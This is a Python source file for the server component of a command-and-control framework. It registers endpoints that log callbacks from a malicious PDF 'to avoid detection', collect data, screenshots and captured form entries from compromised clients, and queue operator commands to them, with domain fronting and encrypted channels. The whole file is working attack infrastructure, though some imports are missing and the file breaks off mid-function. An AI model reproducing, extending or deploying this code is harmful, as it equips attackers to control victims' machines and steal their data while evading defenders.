# core/server_manager.py
import os
import sys
import signal
import threading
import time
import logging
import ssl
from flask import Flask, render_template, request, jsonify, Response
from flask_socketio import SocketIO, emit
from werkzeug.serving import WSGIRequestHandler
from core.config_manager import ConfigManager
from core.session_manager import SessionManager
from core.database_manager import DatabaseManager
from core.auth_manager import AuthManager
from core.validation_manager import ValidationManager
from core.secure_comms import SecureCommunications
from core.rate_limiter import RateLimiter
from core.error_handler import ErrorHandler
from core.encryption_manager import EncryptionManager
from core.domain_fronting import DomainFronting
from core.port_manager import PortManager

class ServerManager:
    def __init__(self, config_path="config.json"):
        self.config_manager = ConfigManager(config_path)
        self.db_manager = DatabaseManager(self.config_manager)
        self.session_manager = SessionManager(self.db_manager)
        self.encryption_manager = EncryptionManager(self.config_manager)
        self.port_manager = PortManager(self.config_manager)
        self.auth_manager = AuthManager(self.config_manager)
        self.validation_manager = ValidationManager(self.config_manager)
        self.secure_comms = SecureCommunications(self.config_manager)
        self.error_handler = ErrorHandler(self.config_manager)
        
        # Initialize Flask app and SocketIO
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = self.config_manager.get('c2.secret_key', 'default-secret-key')
        
        # Configure SSL context
        self.ssl_context = self._setup_ssl()
        
        # Initialize SocketIO with proper configuration
        self.socketio = SocketIO(
            self.app, 
            cors_allowed_origins="*",
            ssl_context=self.ssl_context
        )
        
        # Initialize rate limiter
        try:
            storage_uri = self.config_manager.get('rate_limiting.storage_uri', 'redis://localhost:6379')
            self.rate_limiter = RateLimiter(self.app, self.config_manager, storage_uri=storage_uri)
        except Exception:
            self.rate_limiter = RateLimiter(self.app, self.config_manager)
        
        # Initialize domain fronting if enabled
        if self.config_manager.get('c2.domain_fronting.enabled', False):
            self.domain_fronting = DomainFronting(self.config_manager)
        else:
            self.domain_fronting = None
            
        # Server state
        self.running = False
        self.server_thread = None
        self.shutdown_event = threading.Event()
        
        # Configure logging
        log_level = self.config_manager.get('framework.logging_level', 'INFO')
        logging.basicConfig(
            level=getattr(logging, str(log_level).upper(), logging.INFO),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
        # Register routes
        self._register_routes()
        
        # Register SocketIO events
        self._register_socketio_events()
    
    def _setup_ssl(self):
        """Setup SSL context for HTTPS"""
        try:
            cert_path = self.config_manager.get('c2.ssl_cert', 'certs/server.crt')
            key_path = self.config_manager.get('c2.ssl_key', 'certs/server.key')
            
            if os.path.exists(cert_path) and os.path.exists(key_path):
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(cert_path, key_path)
                return context
            else:
                self.logger.warning("SSL certificates not found, running without SSL")
                return None
        except Exception as e:
            self.logger.error(f"Error setting up SSL: {str(e)}")
            return None
    
    def _register_routes(self):
        """Register all Flask routes with proper authentication and validation"""
        # Dashboard routes
        self.app.route('/')(self.index)
        self.app.route('/dashboard')(self.auth_manager.require_auth(self.dashboard))
        
        # API routes
        self.app.route('/api/command', methods=['POST'])(self.auth_manager.require_auth(self.receive_command))
        self.app.route('/api/sessions')(self.auth_manager.require_auth(self.list_sessions))
        self.app.route('/api/data/<session_id>')(self.auth_manager.require_auth(self.get_session_data))
        self.app.route('/api/callback')(self.handle_pdf_callback)
        self.app.route('/api/data', methods=['POST'])(self.rate_limiter.apply_limits(self.receive_client_data, "10 per minute"))
        self.app.route('/api/commands/<session_id>')(self.get_commands_for_client)
        self.app.route('/api/screenshot', methods=['POST'])(self.rate_limiter.apply_limits(self.receive_screenshot, "5 per minute"))
        self.app.route('/api/forms', methods=['POST'])(self.rate_limiter.apply_limits(self.receive_form_data, "10 per minute"))
        
        # Health and status routes
        self.app.route('/api/health')(self.health_check)
        self.app.route('/api/status')(self.auth_manager.require_auth(self.get_status))
        self.app.route('/api/config', methods=['GET', 'POST'])(self.auth_manager.require_auth(self.config_management))
        
        # Data management routes
        self.app.route('/api/export/<session_id>')(self.auth_manager.require_auth(self.export_data))
        self.app.route('/api/purge', methods=['POST'])(self.auth_manager.require_auth(self.purge_data))
    
    def _register_socketio_events(self):
        """Register SocketIO events for real-time communication"""
        @self.socketio.on('connect')
        def handle_connect():
            self.logger.info(f"Client connected: {request.sid}")
        
        @self.socketio.on('disconnect')
        def handle_disconnect():
            self.logger.info(f"Client disconnected: {request.sid}")
        
        @self.socketio.on('client_event')
        def handle_client_event(data):
            # Handle real-time events from clients
            self.logger.info(f"Received event from {request.sid}: {data}")
    
    def index(self):
        """Main dashboard page"""
        return render_template('dashboard.html')
    
    def dashboard(self):
        """Enhanced dashboard with system metrics"""
        try:
            # Get system statistics
            stats = self.get_server_stats()
            sessions = self.session_manager.get_active_sessions()
            
            return render_template('dashboard.html', stats=stats, sessions=sessions)
        except Exception as e:
            self.error_handler.handle_request_error(e, "dashboard")
            return render_template('dashboard.html', error=str(e))
    
    def list_sessions(self):
        """List all active sessions"""
        try:
            sessions = self.session_manager.get_active_sessions()
            return jsonify(sessions)
        except Exception as e:
            self.error_handler.handle_request_error(e, "list_sessions")
            return jsonify({'error': 'Internal server error'}), 500
    
    def get_session_data(self, session_id):
        """Get data for a specific session"""
        try:
            # Validate session_id
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            data = self.session_manager.get_session(session_id)
            if not data:
                return jsonify({'error': 'Session not found'}), 404
                
            return jsonify(data)
        except Exception as e:
            self.error_handler.handle_request_error(e, "get_session_data")
            return jsonify({'error': 'Internal server error'}), 500
    
    def receive_command(self):
        """Receive command from operator"""
        try:
            data = request.json
            
            # Validate required fields
            if not data or 'session_id' not in data or 'command' not in data:
                return jsonify({'error': 'Missing required fields'}), 400
                
            # Validate session_id
            is_valid, error_msg = self.validation_manager.validate_session_id(data['session_id'])
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            # Validate command
            if not data['command'] or len(data['command']) > 1000:
                return jsonify({'error': 'Invalid command'}), 400
                
            self.session_manager.add_command(data['session_id'], data['command'], data.get('args'))
            return jsonify({'status': 'ok'})
        except Exception as e:
            self.error_handler.handle_request_error(e, "receive_command")
            return jsonify({'error': 'Internal server error'}), 500
    
    def handle_pdf_callback(self):
        """Handle callback from malicious PDF - critical for initial compromise"""
        try:
            # Get client information
            user_agent = request.headers.get('User-Agent', 'unknown')
            ip_address = request.remote_addr
            
            # core/server_manager.py (continued)
            # Create a new session for this PDF victim
            session_id = self.session_manager.create_session(
                source='pdf_callback',
                metadata={
                    'user_agent': user_agent,
                    'ip_address': ip_address,
                    'callback_time': time.time()
                }
            )
            
            # Log the initial callback
            self.logger.info(f"New PDF callback received from {ip_address}, session ID: {session_id}")
            
            # Return a minimal response to avoid detection
            return Response('', status=204)
        except Exception as e:
            self.error_handler.handle_request_error(e, "handle_pdf_callback")
            return Response('', status=500)
    
    def receive_client_data(self):
        """Receive data from compromised client"""
        try:
            # Get and validate session ID
            session_id = request.headers.get('X-Session-ID')
            if not session_id:
                return jsonify({'error': 'Missing session ID'}), 400
                
            # Validate session
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            # Get data from request
            data = request.json
            if not data:
                return jsonify({'error': 'No data provided'}), 400
                
            # Store the data
            self.session_manager.add_data(session_id, data)
            
            # Check for commands to return
            commands = self.session_manager.get_pending_commands(session_id)
            
            return jsonify({
                'status': 'ok',
                'commands': commands or []
            })
        except Exception as e:
            self.error_handler.handle_request_error(e, "receive_client_data")
            return jsonify({'error': 'Internal server error'}), 500
    
    def get_commands_for_client(self, session_id):
        """Get pending commands for a specific client"""
        try:
            # Validate session
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            # Get commands
            commands = self.session_manager.get_pending_commands(session_id)
            
            return jsonify({'commands': commands or []})
        except Exception as e:
            self.error_handler.handle_request_error(e, "get_commands_for_client")
            return jsonify({'error': 'Internal server error'}), 500
    
    def receive_screenshot(self):
        """Receive screenshot from compromised client"""
        try:
            # Get and validate session ID
            session_id = request.headers.get('X-Session-ID')
            if not session_id:
                return jsonify({'error': 'Missing session ID'}), 400
                
            # Validate session
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            # Check if file was uploaded
            if 'screenshot' not in request.files:
                return jsonify({'error': 'No screenshot provided'}), 400
                
            file = request.files['screenshot']
            if file.filename == '':
                return jsonify({'error': 'No file selected'}), 400
                
            # Save the screenshot
            screenshot_path = os.path.join(
                self.config_manager.get('data.screenshots_dir', 'data/screenshots'),
                f"{session_id}_{int(time.time())}.png"
            )
            
            os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)
            file.save(screenshot_path)
            
            # Update session with screenshot path
            self.session_manager.update_session(session_id, {
                'last_screenshot': screenshot_path,
                'last_activity': time.time()
            })
            
            return jsonify({'status': 'ok'})
        except Exception as e:
            self.error_handler.handle_request_error(e, "receive_screenshot")
            return jsonify({'error': 'Internal server error'}), 500
    
    def receive_form_data(self):
        """Receive form data from compromised client"""
        try:
            # Get and validate session ID
            session_id = request.headers.get('X-Session-ID')
            if not session_id:
                return jsonify({'error': 'Missing session ID'}), 400
                
            # Validate session
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            # Get form data
            form_data = request.json
            if not form_data:
                return jsonify({'error': 'No form data provided'}), 400
                
            # Store the form data
            self.session_manager.add_form_data(session_id, form_data)
            
            return jsonify({'status': 'ok'})
        except Exception as e:
            self.error_handler.handle_request_error(e, "receive_form_data")
            return jsonify({'error': 'Internal server error'}), 500
    
    def health_check(self):
        """Health check endpoint for monitoring"""
        return jsonify({
            'status': 'healthy',
            'timestamp': time.time(),
            'version': self.config_manager.get('framework.version', '1.0.0')
        })
    
    def get_status(self):
        """Get detailed server status for authenticated users"""
        try:
            stats = self.get_server_stats()
            return jsonify(stats)
        except Exception as e:
            self.error_handler.handle_request_error(e, "get_status")
            return jsonify({'error': 'Internal server error'}), 500
    
    def get_server_stats(self):
        """Get comprehensive server statistics"""
        try:
            stats = {
                'server': {
                    'uptime': time.time() - self.start_time if hasattr(self, 'start_time') else 0,
                    'version': self.config_manager.get('framework.version', '1.0.0'),
                    'host': self.config_manager.get('c2.host', '0.0.0.0'),
                    'port': self.config_manager.get('c2.port', 443)
                },
                'sessions': {
                    'total': self.session_manager.get_total_sessions(),
                    'active': len(self.session_manager.get_active_sessions()),
                    'new_today': self.session_manager.get_new_sessions_today()
                },
                'data': {
                    'total_size': self.db_manager.get_database_size(),
                    'screenshots': self.session_manager.get_screenshot_count(),
                    'form_data': self.session_manager.get_form_data_count()
                }
            }
            
            return stats
        except Exception as e:
            self.logger.error(f"Error getting server stats: {str(e)}")
            return {}
    
    def config_management(self):
        """Handle configuration management"""
        try:
            if request.method == 'GET':
                # Return current configuration (excluding sensitive data)
                config = self.config_manager.get_all()
                # Remove sensitive fields
                sensitive_fields = ['c2.secret_key', 'c2.ssl_key', 'database.password']
                for field in sensitive_fields:
                    if field in config:
                        parts = field.split('.')
                        if len(parts) == 2 and parts[0] in config and parts[1] in config[parts[0]]:
                            config[parts[0]][parts[1]] = '********'
                
                return jsonify(config)
            else:  # POST
                # Update configuration
                data = request.json
                if not data:
                    return jsonify({'error': 'No configuration data provided'}), 400
                
                # Validate and update configuration
                for key, value in data.items():
                    if key in ['c2.secret_key', 'c2.ssl_key', 'database.password']:
                        continue  # Skip sensitive fields
                    self.config_manager.set(key, value)
                
                # Save configuration
                self.config_manager.save()
                
                return jsonify({'status': 'ok'})
        except Exception as e:
            self.error_handler.handle_request_error(e, "config_management")
            return jsonify({'error': 'Internal server error'}), 500
    
    def export_data(self, session_id):
        """Export data for a specific session"""
        try:
            # Validate session
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return jsonify({'error': error_msg}), 400
                
            # Get session data
            data = self.session_manager.get_session_data_export(session_id)
            if not data:
                return jsonify({'error': 'Session not found'}), 404
                
            # Create filename
            filename = f"session_{session_id}_{int(time.time())}.json"
            
            # Return as file download
            return Response(
                data,
                mimetype='application/json',
                headers={'Content-Disposition': f'attachment; filename={filename}'}
            )
        except Exception as e:
            self.error_handler.handle_request_error(e, "export_data")
            return jsonify({'error': 'Internal server error'}), 500
    
    def purge_data(self):
        """Purge old data based on configuration"""
        try:
            # Get retention period from config
            retention_days = self.config_manager.get('data.retention_days', 30)
            
            # Purge old sessions
            purged_count = self.session_manager.purge_old_sessions(retention_days)
            
            # Purge old screenshots
            screenshots_dir = self.config_manager.get('data.screenshots_dir', 'data/screenshots')
            purged_screenshots = self._purge_old_files(screenshots_dir, retention_days)
            
            return jsonify({
                'status': 'ok',
                'purged_sessions': purged_count,
                'purged_screenshots': purged_screenshots
            })
        except Exception as e:
            self.error_handler.handle_request_error(e, "purge_data")
            return jsonify({'error': 'Internal server error'}), 500
    
    def _purge_old_files(self, directory, retention_days):
        """Purge files older than retention_days from the specified directory"""
        try:
            if not os.path.exists(directory):
                return 0
                
            cutoff_time = time.time() - (retention_days * 24 * 60 * 60)
            purged_count = 0
            
            for filename in os.listdir(directory):
                file_path = os.path.join(directory, filename)
                if os.path.isfile(file_path) and os.path.getmtime(file_path) < cutoff_time:
                    try:
                        os.remove(file_path)
                        purged_count += 1
                    except Exception as e:
                        self.logger.error(f"Error removing file {file_path}: {str(e)}")
                        
            return purged_count
        except Exception as e:
            self.logger.error(f"Error purging files from {directory}: {str(e)}")
            return 0
    
    def start(self):
        """Start the C2 server"""
        try:
            self.running = True
            self.start_time = time.time()
            self.shutdown_event.clear()
            
            # Get server configuration
            host = self.config_manager.get('c2.host', '0.0.0.0')
            port = self.config_manager.get('c2.port', 443)
            debug = self.config_manager.get('framework.debug', False)
            
            # Start server in a separate thread
            self.server_thread = threading.Thread(
                target=self._run_server,
                args=(host, port, debug),
                daemon=True
            )
            self.server_thread.start()
            
            self.logger.info(f"Server started on {host}:{port}")
            
            # Set up signal handlers for graceful shutdown
            signal.signal(signal.SIGINT, self._signal_handler)
            signal.signal(signal.SIGTERM, self._signal_handler)
            
            return True
        except Exception as e:
            self.logger.error(f"Error starting server: {str(e)}")
            return False
    
    def _run_server(self, host, port, debug):
        """Run the Flask server with SocketIO"""
        try:
            if self.ssl_context:
                self.socketio.run(
                    self.app,
                    host=host,
                    port=port,
                    ssl_context=self.ssl_context,
                    debug=debug,
                    use_reloader=False
                )
            else:
                self.socketio.run(
                    self.app,
                    host=host,
                    port=port,
                    debug=debug,
                    use_reloader=False
                )
        except Exception as e:
            self.logger.error(f"Error running server: {str(e)}")
            self.running = False
    
    def stop(self):
        """Stop the C2 server gracefully"""
        try:
            self.logger.info("Shutting down server...")
            self.running = False
            self.shutdown_event.set()
            
            # Stop the SocketIO server
            if self.socketio:
                self.socketio.stop()
            
            # Wait for server thread to finish
            if self.server_thread and self.server_thread.is_alive():
                self.server_thread.join(timeout=5)
            
            # Close database connections
            if self.db_manager:
                self.db_manager.close()
                
            self.logger.info("Server shutdown complete")
            return True
        except Exception as e:
            self.logger.error(f"Error stopping server: {str(e)}")
            return False
    
    def _signal_handler(self, sig, frame):
        """Handle shutdown signals"""
        self.logger.info(f"Received signal {sig}, shutting down...")
        self.stop()
        sys.exit(0)
    
    def restart(self):
        """Restart the C2 server"""
        try:
            self.logger.info("Restarting server...")
            self.stop()
            time.sleep(2)
            return self.start()
        except Exception as e:
            self.logger.error(f"Error restarting server: {str(e)}")
            return False
    
    def is_running(self):
        """Check if the server is currently running"""
        return self.running
    
    def get_active_connections(self):
        """Get information about active connections"""
        try:
            if not self.socketio:
                return []
                
            # Get connected clients from SocketIO
            connections = []
            for sid in self.socketio.server.manager.get_rooms():
                if sid != '/' and sid.startswith('/') is False:  # Exclude default rooms
                    connections.append({
                        'id': sid,
                        'connected_at': time.time(),  # This would need to be tracked properly
                        'session_id': self.session_manager.get_session_by_socket(sid)
                    })
            
            return connections
        except Exception as e:
            self.logger.error(f"Error getting active connections: {str(e)}")
            return []
    
    def send_command_to_client(self, session_id, command, args=None):
        """Send a command to a specific client"""
        try:
            # Validate session
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return False, error_msg
                
            # Add command to session
            self.session_manager.add_command(session_id, command, args)
            
            # If client is connected via SocketIO, send directly
            socket_id = self.session_manager.get_socket_by_session(session_id)
            if socket_id:
                self.socketio.emit('command', {
                    'command': command,
                    'args': args or {}
                }, room=socket_id)
            
            return True, "Command sent successfully"
        except Exception as e:
            self.logger.error(f"Error sending command to client {session_id}: {str(e)}")
            return False, str(e)
    
    def broadcast_to_all_clients(self, message):
        """Broadcast a message to all connected clients"""
        try:
            self.socketio.emit('broadcast', {
                'message': message,
                'timestamp': time.time()
            })
            return True
        except Exception as e:
            self.logger.error(f"Error broadcasting to all clients: {str(e)}")
            return False
    
    def disconnect_client(self, session_id):
        """Force disconnect a client"""
        try:
            # Get socket ID for session
            socket_id = self.session_manager.get_socket_by_session(session_id)
            if socket_id:
                # Disconnect the socket
                self.socketio.emit('disconnect', room=socket_id)
                return True
            return False
        except Exception as e:
            self.logger.error(f"Error disconnecting client {session_id}: {str(e)}")
            return False

    def apply_domain_fronting(self, request):
        """Apply domain fronting if enabled"""
        try:
            if not self.domain_fronting:
                return None
                
            # Check if this request should be fronted
            fronted_domain = self.domain_fronting.get_fronted_domain(request.headers)
            if not fronted_domain:
                return None
                
            # Process the fronted request
            return self.domain_fronting.process_request(request, fronted_domain)
        except Exception as e:
            self.logger.error(f"Error applying domain fronting: {str(e)}")
            return None
    
    def handle_encrypted_request(self, request):
        """Handle encrypted request data"""
        try:
            # Get encrypted data from request
            encrypted_data = request.data
            if not encrypted_data:
                return None, "No encrypted data provided"
                
            # Decrypt the data
            decrypted_data = self.encryption_manager.decrypt(encrypted_data)
            if not decrypted_data:
                return None, "Failed to decrypt data"
                
            # Parse JSON data
            try:
                data = json.loads(decrypted_data)
                return data, None
            except json.JSONDecodeError:
                return None, "Invalid JSON in decrypted data"
        except Exception as e:
            self.logger.error(f"Error handling encrypted request: {str(e)}")
            return None, str(e)
    
    def encrypt_response(self, data):
        """Encrypt response data before sending"""
        try:
            # Convert data to JSON if needed
            if isinstance(data, dict):
                json_data = json.dumps(data)
            else:
                json_data = str(data)
                
            # Encrypt the data
            encrypted_data = self.encryption_manager.encrypt(json_data)
            return encrypted_data
        except Exception as e:
            self.logger.error(f"Error encrypting response: {str(e)}")
            return None
    
    def validate_request_integrity(self, request):
        """Validate the integrity of incoming requests"""
        try:
            # Get signature from headers
            signature = request.headers.get('X-Signature')
            if not signature:
                return False, "Missing signature"
                
            # Get request data
            request_data = request.data
            if not request_data:
                return False, "No data to validate"
                
            # Verify signature
            is_valid = self.secure_comms.verify_signature(request_data, signature)
            if not is_valid:
                return False, "Invalid signature"
                
            return True, "Valid signature"
        except Exception as e:
            self.logger.error(f"Error validating request integrity: {str(e)}")
            return False, str(e)
    
    def setup_custom_routes(self):
        """Setup custom routes based on configuration"""
        try:
            custom_routes = self.config_manager.get('c2.custom_routes', [])
            
            for route_config in custom_routes:
                path = route_config.get('path')
                methods = route_config.get('methods', ['GET'])
                handler = route_config.get('handler')
                
                if not path or not handler:
                    self.logger.warning(f"Invalid custom route configuration: {route_config}")
                    continue
                    
                # Register the custom route
                self.app.route(path, methods=methods)(self._create_custom_handler(handler))
                
            self.logger.info(f"Registered {len(custom_routes)} custom routes")
        except Exception as e:
            self.logger.error(f"Error setting up custom routes: {str(e)}")
    
    def _create_custom_handler(self, handler_name):
        """Create a handler function for custom routes"""
        def custom_handler():
            try:
                # Get the handler function from the handlers module
                from core.custom_handlers import get_handler
                handler_func = get_handler(handler_name)
                
                if not handler_func:
                    return jsonify({'error': 'Handler not found'}), 404
                    
                # Call the handler
                return handler_func(request)
            except Exception as e:
                self.error_handler.handle_request_error(e, f"custom_handler_{handler_name}")
                return jsonify({'error': 'Internal server error'}), 500
                
        return custom_handler
    
    def setup_middleware(self):
        """Setup middleware for request processing"""
        try:
            # Add custom middleware based on configuration
            middleware_config = self.config_manager.get('framework.middleware', [])
            
            for middleware in middleware_config:
                middleware_name = middleware.get('name')
                middleware_path = middleware.get('path')
                
                if not middleware_name:
                    continue
                    
                # Import and apply the middleware
                try:
                    module = importlib.import_module(f"core.middleware.{middleware_name}")
                    apply_middleware = getattr(module, 'apply_middleware', None)
                    
                    if apply_middleware:
                        apply_middleware(self.app, middleware.get('config', {}))
                        self.logger.info(f"Applied middleware: {middleware_name}")
                except ImportError:
                    self.logger.warning(f"Middleware not found: {middleware_name}")
        except Exception as e:
            self.logger.error(f"Error setting up middleware: {str(e)}")
    
    def initialize_plugins(self):
        """Initialize plugins based on configuration"""
        try:
            plugins = self.config_manager.get('plugins.enabled', [])
            
            for plugin_name in plugins:
                try:
                    # Import the plugin
                    module = importlib.import_module(f"plugins.{plugin_name}")
                    initialize = getattr(module, 'initialize', None)
                    
                    if initialize:
                        # Initialize the plugin
                        initialize(self)
                        self.logger.info(f"Initialized plugin: {plugin_name}")
                except ImportError:
                    self.logger.warning(f"Plugin not found: {plugin_name}")
                except Exception as e:
                    self.logger.error(f"Error initializing plugin {plugin_name}: {str(e)}")
        except Exception as e:
            self.logger.error(f"Error initializing plugins: {str(e)}")
    
    def run_maintenance_tasks(self):
        """Run periodic maintenance tasks"""
        try:
            # Get maintenance interval from config
            interval = self.config_manager.get('maintenance.interval', 3600)  # Default: 1 hour
            
            while self.running and not self.shutdown_event.is_set():
                # Purge old data
                retention_days = self.config_manager.get('data.retention_days', 30)
                self.session_manager.purge_old_sessions(retention_days)
                
                # Optimize database
                self.db_manager.optimize()
                
                # Update statistics
                self._update_statistics()
                
                # Wait for next interval or shutdown
                self.shutdown_event.wait(interval)
        except Exception as e:
            self.logger.error(f"Error running maintenance tasks: {str(e)}")
    
    def _update_statistics(self):
        """Update server statistics"""
        try:
            stats = {
                'timestamp': time.time(),
                'active_sessions': len(self.session_manager.get_active_sessions()),
                'total_sessions': self.session_manager.get_total_sessions(),
                'database_size': self.db_manager.get_database_size()
            }
            
            # Store statistics in database
            self.db_manager.store_statistics(stats)
        except Exception as e:
            self.logger.error(f"Error updating statistics: {str(e)}")
    
    def start_maintenance_thread(self):
        """Start the maintenance thread"""
        try:
            self.maintenance_thread = threading.Thread(
                target=self.run_maintenance_tasks,
                daemon=True
            )
            self.maintenance_thread.start()
            self.logger.info("Maintenance thread started")
        except Exception as e:
            self.logger.error(f"Error starting maintenance thread: {str(e)}")

    def get_system_info(self):
        """Get detailed system information for monitoring"""
        try:
            import psutil
            
            # Get system information
            system_info = {
                'cpu': {
                    'usage_percent': psutil.cpu_percent(interval=1),
                    'count': psutil.cpu_count(),
                    'freq': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None
                },
                'memory': {
                    'total': psutil.virtual_memory().total,
                    'available': psutil.virtual_memory().available,
                    'percent': psutil.virtual_memory().percent,
                    'used': psutil.virtual_memory().used
                },
                'disk': {
                    'total': psutil.disk_usage('/').total,
                    'used': psutil.disk_usage('/').used,
                    'free': psutil.disk_usage('/').free,
                    'percent': psutil.disk_usage('/').percent
                },
                'network': {
                    'connections': len(psutil.net_connections()),
                    'bytes_sent': psutil.net_io_counters().bytes_sent,
                    'bytes_recv': psutil.net_io_counters().bytes_recv
                },
                'process': {
                    'pid': os.getpid(),
                    'threads': threading.active_count(),
                    'memory_info': psutil.Process(os.getpid()).memory_info._asdict(),
                    'create_time': psutil.Process(os.getpid()).create_time()
                }
            }
            
            return system_info
        except ImportError:
            self.logger.warning("psutil not available, system info limited")
            return {}
        except Exception as e:
            self.logger.error(f"Error getting system info: {str(e)}")
            return {}
    
    def get_detailed_session_info(self, session_id):
        """Get detailed information about a specific session"""
        try:
            # Validate session
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return None, error_msg
                
            # Get basic session info
            session_data = self.session_manager.get_session(session_id)
            if not session_data:
                return None, "Session not found"
                
            # Get additional details
            detailed_info = {
                'session': session_data,
                'commands': self.session_manager.get_command_history(session_id),
                'data': self.session_manager.get_all_data(session_id),
                'screenshots': self.session_manager.get_screenshots(session_id),
                'form_data': self.session_manager.get_form_data(session_id),
                'statistics': self.session_manager.get_session_statistics(session_id)
            }
            
            return detailed_info, None
        except Exception as e:
            self.logger.error(f"Error getting detailed session info: {str(e)}")
            return None, str(e)
    
    def create_session_backup(self, session_id):
        """Create a backup of a specific session"""
        try:
            # Validate session
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return False, error_msg
                
            # Get session data
            session_data, error = self.get_detailed_session_info(session_id)
            if error:
                return False, error
                
            # Create backup directory if it doesn't exist
            backup_dir = self.config_manager.get('data.backup_dir', 'data/backups')
            os.makedirs(backup_dir, exist_ok=True)
            
            # Create backup filename
            timestamp = int(time.time())
            backup_file = os.path.join(backup_dir, f"session_{session_id}_{timestamp}.json")
            
            # Write backup file
            with open(backup_file, 'w') as f:
                json.dump(session_data, f, indent=2)
                
            # Compress the backup file
            try:
                import gzip
                with open(backup_file, 'rb') as f_in:
                    with gzip.open(f"{backup_file}.gz", 'wb') as f_out:
                        f_out.writelines(f_in)
                
                # Remove uncompressed file
                os.remove(backup_file)
                backup_file = f"{backup_file}.gz"
            except ImportError:
                self.logger.warning("gzip not available, backup not compressed")
                
            return True, backup_file
        except Exception as e:
            self.logger.error(f"Error creating session backup: {str(e)}")
            return False, str(e)
    
    def restore_session_from_backup(self, backup_file):
        """Restore a session from a backup file"""
        try:
            # Check if file exists
            if not os.path.exists(backup_file):
                return False, "Backup file not found"
                
            # Determine if file is compressed
            is_compressed = backup_file.endswith('.gz')
            
            # Read backup file
            try:
                if is_compressed:
                    import gzip
                    with gzip.open(backup_file, 'rt') as f:
                        session_data = json.load(f)
                else:
                    with open(backup_file, 'r') as f:
                        session_data = json.load(f)
            except Exception as e:
                return False, f"Error reading backup file: {str(e)}"
                
            # Validate backup data
            if 'session' not in session_data:
                return False, "Invalid backup file format"
                
            # Restore session
            session_id = session_data['session'].get('id')
            if not session_id:
                return False, "Invalid session ID in backup"
                
            # Check if session already exists
            if self.session_manager.session_exists(session_id):
                return False, f"Session {session_id} already exists"
                
            # Restore session data
            success = self.session_manager.restore_session(session_data)
            if not success:
                return False, "Error restoring session data"
                
            return True, f"Session {session_id} restored successfully"
        except Exception as e:
            self.logger.error(f"Error restoring session from backup: {str(e)}")
            return False, str(e)
    
    def generate_session_report(self, session_id, format='json'):
        """Generate a report for a specific session"""
        try:
            # Validate session
            is_valid, error_msg = self.validation_manager.validate_session_id(session_id)
            if not is_valid:
                return None, error_msg
                
            # Get session data
            session_data, error = self.get_detailed_session_info(session_id)
            if error:
                return None, error
                
            # Generate report based on format
            if format.lower() == 'json':
                report = json.dumps(session_data, indent=2)
                content_type = 'application/json'
                filename = f"session_{session_id}_report_{int(time.time())}.json"
            elif format.lower() == 'html':
                # Generate HTML report
                template_path = os.path.join('templates', 'session_report.html')
                if os.path.exists(template_path):
                    with open(template_path, 'r') as f:
                        template = f.read()
                    
                    # Simple template replacement
                    report = template.replace('{{SESSION_ID}}', session_id)
                    report = report.replace('{{TIMESTAMP}}', str(int(time.time())))
                    report = report.replace('{{DATA}}', json.dumps(session_data, indent=2))
                    
                    content_type = 'text/html'
                    filename = f"session_{session_id}_report_{int(time.time())}.html"
                else:
                    return None, "HTML template not found"
            else:
                return None, f"Unsupported report format: {format}"
                
            return {
                'content': report,
                'content_type': content_type,
                'filename': filename
            }, None
        except Exception as e:
            self.logger.error(f"Error generating session report: {str(e)}")
            return None, str(e)
    
    def setup_api_keys(self):
        """Setup API keys for external access"""
        try:
            # Get API keys from config
            api_keys = self.config_manager.get('api.keys', [])
            
            # Register API key authentication decorator
            def require_api_key(f):
                @wraps(f)
                def decorated_function(*args, **kwargs):
                    # Get API key from header
                    api_key = request.headers.get('X-API-Key')
                    
                    # Validate API key
                    if api_key not in api_keys:
                        return jsonify({'error': 'Invalid API key'}), 401
                        
                    return f(*args, **kwargs)
                return decorated_function
            
            # Store decorator for use in routes
            self.require_api_key = require_api_key
            
            # Register API routes
            self.app.route('/api/v1/sessions')(self.require_api_key(self.list_sessions))
            self.app.route('/api/v1/session/<session_id>')(self.require_api_key(self.get_session_data))
            self.app.route('/api/v1/command', methods=['POST'])(self.require_api_key(self.receive_command))
            
            self.logger.info(f"API access configured with {len(api_keys)} keys")
        except Exception as e:
            self.logger.error(f"Error setting up API keys: {str(e)}")


    def setup_websocket_authentication(self):
        """Setup authentication for WebSocket connections"""
        try:
            # Get authentication settings
            auth_required = self.config_manager.get('c2.websocket_auth', True)
            
            if not auth_required:
                return
                
            # Override SocketIO connect event handler
            original_connect = self.socketio.server.handlers['connect']
            
            @self.socketio.on('connect')
            def handle_connect(auth=None):
                try:
                    # Get token from auth data or query string
                    token = None
                    if auth and 'token' in auth:
                        token = auth['token']
                    elif 'token' in request.args:
                        token = request.args['token']
                    
                    # Validate token
                    if not token or not self.auth_manager.validate_token(token):
                        self.logger.warning(f"WebSocket authentication failed for {request.sid}")
                        return False
                        
                    # Store authenticated user info
                    self.auth_manager.set_socket_user(request.sid, token)
                    
                    # Call original connect handler
                    return original_connect()
                except Exception as e:
                    self.logger.error(f"Error in WebSocket authentication: {str(e)}")
                    return False
            
            self.logger.info("WebSocket authentication configured")
        except Exception as e:
            self.logger.error(f"Error setting up WebSocket authentication: {str(e)}")
    
    def setup_rate_limiting(self):
        """Setup rate limiting for API endpoints"""
        try:
            # Get rate limiting settings
            rate_limiting_enabled = self.config_manager.get('rate_limiting.enabled', True)
            
